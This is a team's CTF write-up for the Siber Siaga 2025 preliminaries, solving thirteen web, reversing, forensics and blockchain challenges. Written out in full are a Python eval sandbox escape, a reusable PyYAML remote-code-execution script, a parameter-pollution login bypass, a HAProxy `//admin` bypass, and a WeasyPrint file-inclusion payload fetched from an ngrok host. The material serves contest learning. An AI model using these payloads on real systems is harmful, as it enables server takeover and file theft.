---
title:  "Siber Siaga CTF 2025 (Preliminary) - Writeup"
date:   2025-09-21 00:30:00 +0800
categories: [CTF Writeup]
tags: [Siber Siaga CTF 2025]
---
*By Team pulupuluultraman - Mynz, Jerit3787 & rizzykun*

> This challenge was completed during the CTF.
{: .prompt-info}

## Challenge 1: Spelling Bee

**Description:**

Just spell the flag correctly then I will give it to you.

Challenge Creator: @penguincat
`nc 5.223.49.127 57004`

**Answer:**

Given the credentials for connecting and each time have 5 tries, while the 5th one will never show the results, so 4 try only

![](assets/img/siber-siaga-25/image6.png)

Here is the request of my try and i combine it to get the flag

```
______5_____7___5____3______3________3_____7__
____R_______7___________4__________________7__
S_B__2_______1___________________1____________
_________0______________________________0___0_
___________________________b______tt_____t____
__________m___m__________n____________________
__________________l_____________l___l__p______
___________e___e_______c______________________
____________________f_____________tt_____t____
______________________________a___________a___
_I_E___{_____________________________________}
S_______s__________i__________________________

```

>Flag: `SIBER25{s0me71me5_lif3_c4n_b3_a_l1ttl3_p0ta70}`
{: .prompt-tip}

## Challenge 2: Entry to Meta City

**Description:**

To gain entry to the prestige city, you will first need to prove your worth unless you are an admin.

Flag Format: SIBER25{flag} Challenge Creator: @penguincat
`http://5.223.49.127:47001/`

**Answer**

![](assets/img/siber-siaga-25/image12.png)

Just enter admin and you will get the flag

![](assets/img/siber-siaga-25/image5.png)

>Flag: `SIBER25{w3lc0m3_70_7h3_c00l357_c17y}`
{: .prompt-tip}

## Challenge 3: A Byte Tales

**Description:**

Choose your path and decide your own fate.

Challenge Creator: @penguincat Flag Format: SIBER25{flag}

`nc 5.223.49.127 57001`

**Answer:**

![](assets/img/siber-siaga-25/image3.png)

![](assets/img/siber-siaga-25/image14.png)

Based on the source code given, you can see flag.txt which means the server will also have a file named flag.txt in it, now we just need to find ways to exploit it.

In the code, you can find critical things which are eval functions which can execute any command we put in the story as long as it is not in banned words.

For this im trying different combinations to get the flag

```py
[open('flag.txt').read()]
f"{open('flag.txt').read()}"
repr(open('flag.txt').read())
```

Until i get this one 

```py
__builtins__.__dict__['pr'+'int'](open('flag.txt').read())
```

![](assets/img/siber-siaga-25/image9.png)

>Flag: `SIBER25{St1ck_70_7h3_5toryl1n3!}`
{: .prompt-tip}

## Challenge 4: Easy Cipher

**Description:**

classic reverse

Flag Format: SIBER25{flag}

Challenge Creator: @y_1_16

**Answer:**

Given r1 file, which I quickly analyze it using Ghidra. Then, I found multiple interesting functions, then ask my friend chatgpt to explain how does it behave.

https://chatgpt.com/share/68ce5c2e-f310-800e-b10d-a7c24a31a60a

To sum up, the program function like : 
- The program splits your candidate flag into two halves, processes each half with `FUN_0010137a`, and checks the two 16-byte results against two 16-byte constants.
- `FUN_0010137a`:
  - Pads to 8-byte blocks and processes each 8-byte block as two 4-byte halves L0 and R0.
  - Runs two Feistel rounds (round numbers 1 and 2). The round function is `F(R, round) = R XOR key_shift(round)`, where `key_shift(round)[i] = key[(i + round) % keylen].`
  - After 2 rounds the output block (8 bytes) becomes:
    - `Left_out = L0 ^ R0 ^ K1`
    - `Right_out = L0 ^ K1 ^ K2` where `K1 = key_shift(1)` and `K2 = key_shift(2)` (each 4 bytes).
- These are linear XOR equations, so if you have the key (the 8 bytes read from `r1`) you can invert them per 8-byte block:
  - `L0 = Right_out ^ K1 ^ K2`
  - `R0 = L0 ^ Left_out ^ K1`
- The program expects two 8-byte blocks per half (so each half becomes 16 bytes after processing); the two halves combined are the flag candidate.

So, after you find the bytes, by using command: 

```bash
xxd -p -l 8 r1        # prints 8 bytes as hex
hexdump -C -n 8 r1    # format the output
```

Then, you will get the flag : 

>Flag: `SIBER25{n0w_y0u_l34rn_r3v3r53}`
{: .prompt-tip}

## Challenge 5: Dumpster Diving

**Description:**

Aiya. I accidentally deleted the flag when cleaning up my Desktop.

Flag Format: SIBER25{flag} 

Zip Password: 0b20ca0c4860364140f51583e32bb28cdeecf13ebad62fd66b4f9786bf2c700d 

Challenge Creator: @identities

**Answer:**

Given an image file and .txt file. I immediately opened the image file using Exterro FTK Imager.

![](assets/img/siber-siaga-25/image2.png)

As I was traversing through the image file, I found multiple image files in the recycle bin. When I click it to read as ASCII, I get the flag : 

>Flag: `SIBER25{1OokiN6_foR_7R4ShED_1T3ms}`
{: .prompt-tip}

## Challenge 6: Viewport

**Description:**

Oops. I accidentally deleted the flag when cleaning up my Desktop.

Flag Format: SIBER25{flag} 

Zip Password: e0ff450ab4c79a7810ad46b45f4b8f10678a63df866757566d17b8b998be4161 

Challenge Creator: @identities

**Answer:**

Just like the Dumpster challenge, I quickly open the image file given using  Exterro FTK Imager. 

![](assets/img/siber-siaga-25/image7.png)

I found out there was multiple interesting file directories, and when for looking.

![](assets/img/siber-siaga-25/image2.png)

In the explorer folder, I noticed there are multiple deleted files. So I try to export them to my laptop and try to see it using tools named Thumb cache viewer.

![](assets/img/siber-siaga-25/image8.png)

I check every single file and I see the flag in an image. Then I merged all the info from all the images and got the flag.

>Flag: `SIBER25{V3RY_sMA1L_thUm8n411S}`
{: .prompt-tip}

## Challenge 7: Guess PWD

**Description:**

only 4 digits, guess it !

Flag Format: SIBER25{flag}

Challenge Creator: @y_1_16

**Answer:**

I guess I'm pushing my luck again today.

Given an apk file, so I'm using apktool (Sorry I'm just googling how to analyse apk files and apktool is one of the options) and in the command prompt i run this command to extract it.

```bash
apktool d app-debug.apk
```

After that, im opening vscode and just find `SIBER25{`

![](assets/img/siber-siaga-25/image14.png)

Sorry for unintended solution 🙏

>Flag: `SIBER25{y0u_cr4ck_l061n_w17h_wh47_w4y?}`
{: .prompt-tip}

## Challenge 8: Deep on Adversarial

**Description:**

Recently, our AI Tech Support behaved strangely. During investigation, we discovered two odd files on the culprit device are identical to a suspicious file from our server. We suspect something malicious is hidden inside the image itself, but we couldn’t see it directly. Can you figure out how to uncover what’s within the image that can only be seen by AI?

Flag Format: SIBER25{flag} 

Challenge Creator: @penguincat

**Answer:**

I'm using Github Copilot with Claude Sonnet 4 as a model in this challenge, here's the link for my [conversation](https://drive.google.com/file/d/1OPhHUuAXjbubUqqjEMs7aOXZWU_N_fHH/view?usp=sharing). For easy navigation, i suggest find requestID to see my prompt.

So, here's the [code](https://drive.google.com/file/d/1dx0XkrEyqQ6Pv_3Ro1lp_v8DyNQAeSd9/view?usp=sharing) for solving the challenge. Below is one of the result from executing the code.

![](assets/img/siber-siaga-25/image11.png)

>Flag: `SIBER25{l3arn1ng_m4ch1n3_l3arn1ng}`
{: .prompt-tip}

## Challenge 9: Bulk Import Blues (web)

*Solved by: Jerit3787*

**Description:**

Acme’s internal inventory tool lets staff bulk import product data and check stock. I’m sure i made it secured but did i miss out anything?

Flag format: SIBER25{flag}

Challenge Creator: @jin_707

**Solution:**
The website allows users to enter user’s YAML scripts. Under the hood, the `/process` tag is allowing user’s input to be rendered immediately without sanitisation.

Script used:

```py
#!/usr/bin/env python3
"""
exploit_yaml_rce.py


Usage:
   python3 exploit_yaml_rce.py --url http://localhost:5000/process
   python3 exploit_yaml_rce.py --url http://10.10.10.5:5000/process --flag /flag.txt
   python3 exploit_yaml_rce.py --url http://target:5000/process --cmd "id"


Note: This targets an app using unsafe yaml.load (PyYAML). Use only on systems you own / are authorized to test.
"""
import argparse
import requests
import sys


DEFAULT_URL = "http://127.0.0.1:5001/process"
DEFAULT_FLAG = "/flag.txt"


PAYLOAD_TEMPLATE_CHECK_OUTPUT = """!!python/object/apply:subprocess.check_output [["{cmd}"]]
"""
# For multi-arg commands (preferred), use list form:
PAYLOAD_TEMPLATE_CHECK_OUTPUT_ARGS = """!!python/object/apply:subprocess.check_output [["{prog}", {args}]]
"""


def make_payload_for_cmd(cmd_str):
   """
   Build a payload that calls subprocess.check_output.
   If cmd_str contains spaces, send it as a single string to /bin/sh -c so shell features work.
   """
   # prefer to call bash -c or sh -c to allow complex commands
   # produce: !!python/object/apply:subprocess.check_output [["/bin/sh", "-c", "cat /flag.txt"]]
   prog = "/bin/sh"
   args = '"-c", ' + repr(cmd_str)  # repr will quote correctly
   return PAYLOAD_TEMPLATE_CHECK_OUTPUT_ARGS.format(prog=prog, args=args)


def post_payload(url, payload, timeout=10):
   data = {"yaml_content": payload}
   try:
       r = requests.post(url, data=data, timeout=timeout)
   except Exception as e:
       print(f"[!] Request failed: {e}", file=sys.stderr)
       return None
   return r


def main():
   p = argparse.ArgumentParser(description="Exploit unsafe PyYAML yaml.load via /process endpoint")
   p.add_argument("--url", "-u", default=DEFAULT_URL, help="Full URL to /process endpoint (default: %(default)s)")
   p.add_argument("--flag", "-f", default=DEFAULT_FLAG, help="Flag path to try (default: %(default)s)")
   p.add_argument("--cmd", "-c", help="Custom command to run instead of cat <flag>")
   p.add_argument("--raw", action="store_true", help="Send a raw payload from stdin (reads payload from piped stdin)")
   args = p.parse_args()


   if args.raw:
       print("[*] Reading raw payload from stdin... (end with EOF / Ctrl-D)")
       raw = sys.stdin.read()
       payload = raw
   else:
       if args.cmd:
           cmd = args.cmd
       else:
           cmd = f"cat {args.flag}"
       payload = make_payload_for_cmd(cmd)


   print("[*] URL:", args.url)
   print("[*] Payload to send:")
   print("-----")
   print(payload)
   print("-----")


   r = post_payload(args.url, payload)
   if r is None:
       print("[!] No response.")
       return


   print(f"[*] HTTP {r.status_code}\n")
   # Print full response text so you can see YAML dump, HTML, etc.
   print(r.text)


if __name__ == "__main__":
   main()
```

Running with command `python3 test.py --url http://5.223.49.127:27003/process --flag /flag.txt` produces as follows:

```html
(tructuated)
<div class="result success">
            Import processed successfully:

!!binary | U0lCRVIyNXtZOG1MX0ExbnRfbTRya1VQX2w0bmd1NGczISEhfQ0K
</div>
```

Data is sent by Base64 and when using CyberChef to change from Base64 produces the flag as follows.

>Flag: `SIBER25{Y8mL_A1nt_m4rkUP_l4ngu4g3!!!}`
{: .prompt-tip}

## Challenge 10: EcoQuery (web)

*Solved by: Jerit3787*

**Description:**

Welcome to EcoQuery: your trusted gateway to environmentally friendly data access. Only verified users can enter - administrators enjoy full system privileges, while guest accounts remain locked down.

Flag Format: SIBER25{flag}

Challenge Creator: @hanming0510

**Solution:**

The system allows users to login to the system.

![](assets/img/siber-siaga-25/image4.png)

With an admin account, users will be able to access more data than the normal one. By specifying twice the username, the admin will be allowed but the validation is being done as guest login information. Thus, admin access will be granted.

```bash
curl -v -X POST \  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'username=admin&username=guest&password=guest' \
  'http://5.223.49.127:27001/index.php'

*   Trying 5.223.49.127:27001...
* Connected to 5.223.49.127 (5.223.49.127) port 27001
* using HTTP/1.x
> POST /index.php HTTP/1.1
> Host: 5.223.49.127:27001
> User-Agent: curl/8.13.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 44
> 
* upload completely sent off: 44 bytes
< HTTP/1.1 200 OK
< Date: Sat, 20 Sep 2025 09:09:10 GMT
< Server: Apache/2.4.65 (Debian)
< X-Powered-By: PHP/8.1.33
< Set-Cookie: PHPSESSID=babbc4dc390d87f99e6bae4966cdb548; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 1513
< Content-Type: text/html; charset=UTF-8
< 
<!DOCTYPE html>
<html>
<head>
    <title>Authentication System</title>
    <style>body{font-family:Arial,sans-serif;margin:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh}.container{background:#fff;padding:30px;border-radius:10px;max-width:400px;margin:0 auto}h1{text-align:center;color:#333}form input{display:block;width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:5px;box-sizing:border-box}button{width:100%;padding:10px;background:#007cba;color:white;border:none;border-radius:5px;cursor:pointer}.msg{margin:10px 0;padding:10px;border-radius:5px}.success{background:#d4edda;color:#155724}.error{background:#f8d7da;color:#721c24}.flag{background:#fff3cd;color:#856404;font-weight:bold;font-family:monospace}</style>
</head>
<body>
    <div class="container">
        <h1>🔒 System Access</h1>
        
                    <div class="msg success">
                User: <strong>guest</strong><br>
                Role: <strong>administrator</strong>
            </div>
            
                            <div class="msg flag">
                    🎯 FLAG: SIBER25{h77p_p4r4m_p0llu710n_1n_php}                </div>
                        
            <div style="text-align:center; margin-top:20px;">
                <a href="?logout=1">Logout</a>
            </div>
                
                    <div class="msg success">
                Welcome, guest!            </div>
            </div>
</body>
</html>
* Connection #0 to host 5.223.49.127 left intact
```

>Flag: `SIBER25{h77p_p4r4m_p0llu710n_1n_php}`
{: .prompt-tip}

## Challenge 11: Private Party (web)

*Solved by: Jerit3787*

**Description:**

This is a very secret and exclusive party for only special, powerful, wealthy and educated people and you are not invited.

Challenge Creator: @penguincat

**Solution:**

Users are able to login if their accounts are created by Admin (so-called private & invitation only access)

![](assets/img/siber-siaga-25/image10.png)

To obtain access we need to access `/admin`. But, `/admin` is blocked by default. HAProxy only block literal words like `/admin` but can be bypassed by writing as `//admin`.

When successfully accessed the admin panel, we can create our own account. For simplicity and reproducibility, I’ve completed using curl and managed sessions via cookies only.

Create an account hacker with a password of password123.

```bash
curl -X POST http://5.223.49.127:8001//admin \
 -H "Content-Type: application/json" \
 -d '{"username":"hacker","password":"password123"}' \
 -v
```

After we have created an account, we got the so-called exclusive access. Now, let’s login to the page using our credentials that we just created.

Login to the account using created credentials.

```bash
curl -c live_cookies.txt \
 -X POST http://5.223.49.127:8001/login \
 -d "username=hacker&password=password123"
 ```

After gaining access, the flag is located at the dashboard. Pulling the dashboard using the cookies gets us the flag.

Fetch Flag on the dashboard using cookies session

```
curl -b live_cookies.txt http://5.223.49.127:8001/dashboard
```


And the result is as follows:
```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Private Party</title>
    <link rel="stylesheet" href="/static/css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Quantico:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
  </head>
  <body>
    <div class="container">
      <div class="site-header">
        <img src="/static/assets/title.png" 
             alt="Site Logo" class="site-logo">
      </div>
      
        
          
            <div class="flash success">Login successful.</div>
          
        
      
      
  <h2>Forum Dashboard</h2>
  <p>Welcome, <strong>hacker</strong>.</p>
  <div class="flag">SIBER25{s3lf_1nv17ed_gu35ts_wh47?}</div>

    </div>
  </body>
</html>%
```

>Flag: `SIBER25{s3lf_1nv17ed_gu35s_wh47?}`
{: .prompt-tip}

## Challenge 12: Safe_PDF (Web)

*Solved by: Jerit3787*

**Description:**

Need a PDF version of your favourite web page? This handy tool does just that - simply enter a URL, and we’ll generate a PDF snapshot for you. Quick, clean and convenient.

Flag format: SIBER25{flag}

Challenge Creator: @hanming0510

**Solution:**

For this one, I just solved similar to this. It uses a vulnerability I think that causes Local File Inclusion (LFI) that is when user’s input is not santised properly. Any html tags gets parsed by weasyprint (a popular html to pdf tool). 

Thus, by crafting a HTML that causes weasyprint to include the file inside the PDF, we can control what items gets to enter the PDF.

Create an html that attaches local file (flag)

```html
<!doctype html>
<html>
 <head>
   <title>x</title>
   <link rel="attachment" href="file:///app/flag.txt" />
 </head>
 <body>hi</body>
</html>
```

The twist here is that we can only supply URL to the server. Thus, hosting or just proxy our local server to be accessible to the server is enough here. 

Host on anywhere for the server to fetch (i used ngrok)

```bash
Python -m http.server 8080 && ngrok http 8080
```

Then, Send the link to the server to fetch and download the resulting pdf

```bash
curl -X POST -d "url=https://a0e6375f976e.ngrok-free.app/test.html" "http://5.223.49.127:27002/" -o flag_result.pdf
```

With the file, Extract flag from the pdf

```bash
pdfdetach –saveall flag_result.pdf
```

After extracting, Extract text from the flag.txt to obtain the flag.

```bash
cat flag.txt
```

>Flag: `SIBER25{555555555rf_1n_PDF_c0nv3r73r} ` (tho i don’t believe its ssrf, kinda)
{: .prompt-tip}

## Challenge 13: Puzzle (Blockchain)

*Solved by: Jerit3787*

**Description:**

I found this smart contract in an old blockchain archive. The creator left a message inside, could you find it?

The challenge is about the some left the data on the blockchain. Then, you need to find inside the blockchain to fetch the flag.

First, Render on the server the blockchain and get the credentials to access the blockchain.

Solve the blockchain problem using this script. (I’m not good in this, ChatGPT is my friend)

```py
from web3 import Web3


# Connection details from credentials
rpc_url = 'http://5.223.49.127:57002/59a465b1-ce5c-41ae-8202-8d38afc11ff2'
setup_address = '0x3709D83409613e246494f9052970DbAdbE3Db992'
private_key = 'b9591bdbfdf2a7b00d0859ec87856fb3224b07087864ec847ac48702c6eeaba4'
wallet_addr = '0x62f3d3D43395956749979b028877861424Ea83B7'


print('🎯 CTF Puzzle Attack - Fixed Version')
print('=' * 40)


try:
   # Connect to blockchain
   w3 = Web3(Web3.HTTPProvider(rpc_url))
   print(f'✅ Connected: {w3.is_connected()}')
  
   # Setup contract ABI
   setup_abi = [
       {'inputs': [], 'name': 'getPuzzle', 'outputs': [{'internalType': 'contract Puzzle', 'name': '', 'type': 'address'}], 'stateMutability': 'view', 'type': 'function'}
   ]
  
   # Puzzle contract ABI
   puzzle_abi = [
       {'inputs': [], 'name': 'seedVar', 'outputs': [{'internalType': 'uint8', 'name': '', 'type': 'uint8'}], 'stateMutability': 'view', 'type': 'function'},
       {'inputs': [{'internalType': 'uint8', 'name': 'x', 'type': 'uint8'}], 'name': 'seedVarStateChanging', 'outputs': [], 'stateMutability': 'nonpayable', 'type': 'function'},
       {'inputs': [], 'name': 'reveal', 'outputs': [{'internalType': 'string', 'name': '', 'type': 'string'}], 'stateMutability': 'view', 'type': 'function'}
   ]
  
   # Get contracts
   setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi)
   puzzle_address = setup_contract.functions.getPuzzle().call()
   puzzle_contract = w3.eth.contract(address=puzzle_address, abi=puzzle_abi)
  
   print(f'🧩 Puzzle: {puzzle_address}')
  
   # Check initial state
   initial_seed = puzzle_contract.functions.seedVar().call()
   print(f'🔍 Initial seedVar: {initial_seed}')
  
   print()
   print('⚡ EXECUTING ATTACK:')
   print('1. Calling seedVarStateChanging(53)...')
  
   # Create account from private key
   account = w3.eth.account.from_key(private_key)
   print(f'👛 Using account: {account.address}')
  
   # Build transaction with lower gas price
   tx = puzzle_contract.functions.seedVarStateChanging(53).build_transaction({
       'from': account.address,
       'gas': 100000,
       'gasPrice': w3.to_wei('1', 'gwei'),  # Lower gas price
       'nonce': w3.eth.get_transaction_count(account.address)
   })
  
   print(f'📊 Transaction details: gas={tx[\"gas\"]}, gasPrice={tx[\"gasPrice\"]}')
  
   # Sign and send transaction (fixed syntax)
   signed_tx = w3.eth.account.sign_transaction(tx, private_key)
   tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)  # Fixed: raw_transaction
  
   print(f'📄 Transaction hash: {tx_hash.hex()}')
  
   # Wait for confirmation
   print('⏳ Waiting for confirmation...')
   tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
   print(f'✅ Confirmed in block: {tx_receipt.blockNumber}')
  
   # Check new seedVar
   new_seed = puzzle_contract.functions.seedVar().call()
   print(f'🔍 New seedVar: {new_seed}')
  
   if new_seed == 0:
       print('✅ seedVar successfully changed to 0!')
   else:
       print('❌ seedVar not changed - attack may have failed')
  
   print()
   print('2. Revealing the flag...')
   try:
       flag = puzzle_contract.functions.reveal().call()
       print(f'🏆 FLAG: {flag}')
       print()
       print('🎉 SUCCESS! Copy this flag and submit it on the CTF website!')
       print(f'FLAG: {flag}')
   except Exception as e:
       print(f'❌ Flag reveal failed: {e}')
  
except Exception as e:
   print(f'❌ Error: {e}')
   import traceback
   traceback.print_exc()
```

After the script finishes, Returns the flag:
```bash
🎯 CTF Puzzle Attack - Fixed Version
========================================
✅ Connected: True
🧩 Puzzle: 0xc50DE7eEbAD85010AB57Bc69940532f950447510
🔍 Initial seedVar: 1

⚡ EXECUTING ATTACK:
1. Calling seedVarStateChanging(53)...
👛 Using account: 0x62f3d3D43395956749979b028877861424Ea83B7
📊 Transaction details: gas=100000, gasPrice=1000000000
📄 Transaction hash: d1a5ea837f79ef9b73f24c6b23dd0babcb610e85e1024d598a045b4ef1ae67e4
⏳ Waiting for confirmation...
✅ Confirmed in block: 2
🔍 New seedVar: 0
✅ seedVar successfully changed to 0!

2. Revealing the flag...
🏆 FLAG: SIBER25{uNd3R5tAnD_T0_C0mP13t3_Th13_J1g54w_pUzZ13}

🎉 SUCCESS! Copy this flag and submit it on the CTF website!
```

>FLAG: `SIBER25{uNd3R5tAnD_T0_C0mP13t3_Th13_J1g54w_pUzZ13}`
{: .prompt-tip}